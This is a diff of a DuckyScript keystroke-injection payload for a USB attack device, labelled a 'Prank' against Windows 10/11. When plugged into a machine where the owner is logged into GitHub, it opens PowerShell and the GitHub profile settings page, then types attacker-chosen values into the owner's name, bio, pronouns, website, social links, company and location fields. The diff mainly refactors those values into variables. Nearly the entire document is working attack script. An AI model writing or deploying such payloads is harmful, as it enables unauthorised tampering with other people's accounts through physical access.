@@ -1,18 +1,37 @@
 * REM ###################################################
-* REM #                                                 |
-* REM # Title        : Change Github Profile Settings   |
-* REM # Author       : Aleff                            |
-* REM # Version      : 1.0                              |
-* REM # Category     : Prank                            |
-* REM # Target       : Windows 10/11                    |
-* REM #                                                 |
+* REM #                                                 #
+* REM # Title        : Change Github Profile Settings   #
+* REM # Author       : Aleff                            #
+* REM # Version      : 1.0                              #
+* REM # Category     : Prank                            #
+* REM # Target       : Windows 10/11                    #
+* REM #                                                 #
 * REM ###################################################
 
+ATTACKMODE HID
 
-* REM Requirements:
-* REM     - Internet connection
-* REM     - Logged in Github
+QUACK REM REQUIREMENTS
+* REM Internet connection
+* REM Logged in Github
 
+QUACK REM VARIABLES
+* REM 1) Here you should define the new name
+USERNAME='example'
+* REM 2) Here you should define the new Biography
+BIO='example'
+* REM 3) Here you should define the custom pronouns
+CUSTOM-PRONOUNS='example'
+* REM 4) Here you should define the new personal website url
+URL='example'
+* REM 5) Here you should define the new social network links
+SOCIAL-ACCOUNT-1='example'
+SOCIAL-ACCOUNT-2='example'
+SOCIAL-ACCOUNT-3='example'
+SOCIAL-ACCOUNT-4='example'
+* REM 6) Here you should define the new company
+COMPANY='example'
+* REM 7) Here you should define the new location
+LOCATION='example'
 
 QUACK DELAY 1000
 QUACK GUI r
@@ -21,7 +40,7 @@ QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 500
 
-QUACK STRING Start-Process "https://github.com/settings/profile"; exit;
+QUACK STRING Start-Process \"https://github.com/settings/profile\"; exit;
 QUACK ENTER
 * REM It depends by the computer power and by the internet connection power
 QUACK DELAY 2000
@@ -63,39 +82,32 @@ QUACK TAB
 QUACK TAB
 QUACK TAB
 QUACK TAB
-* REM Here you should define the new name
-QUACK STRING NAME
+QUACK STRING $USERNAME
 QUACK TAB
 QUACK TAB
 QUACK TAB
 QUACK TAB
-* REM Here you should define the new Biography
-QUACK STRING BIO
+QUACK STRING $BIO
 QUACK TAB
 QUACK DOWNARROW
 QUACK DOWNARROW
 QUACK DOWNARROW
 QUACK DOWNARROW
-* REM Here you should define the custom pronouns
-QUACK STRING CUSTOM-PRONOUNS
+QUACK STRING $CUSTOM-PRONOUNS
 QUACK TAB
-* REM Here you should define the new personal website url
-QUACK STRING URL
+QUACK STRING $URL
 QUACK TAB
-* REM Here you should define the new social network links
-QUACK STRING SOCIAL-ACCOUNT-1
+QUACK STRING $SOCIAL-ACCOUNT-1
 QUACK TAB
-QUACK STRING SOCIAL-ACCOUNT-2
+QUACK STRING $SOCIAL-ACCOUNT-2
 QUACK TAB
-QUACK STRING SOCIAL-ACCOUNT-3
+QUACK STRING $SOCIAL-ACCOUNT-3
 QUACK TAB
-QUACK STRING SOCIAL-ACCOUNT-4
+QUACK STRING $SOCIAL-ACCOUNT-4
 QUACK TAB
-* REM Here you should define the new company
-QUACK STRING COMPANY
+QUACK STRING $COMPANY
 QUACK TAB
-* REM Here you should define the new location
-QUACK STRING LOCATION
+QUACK STRING $LOCATION
 QUACK TAB
 QUACK TAB
 QUACK TAB
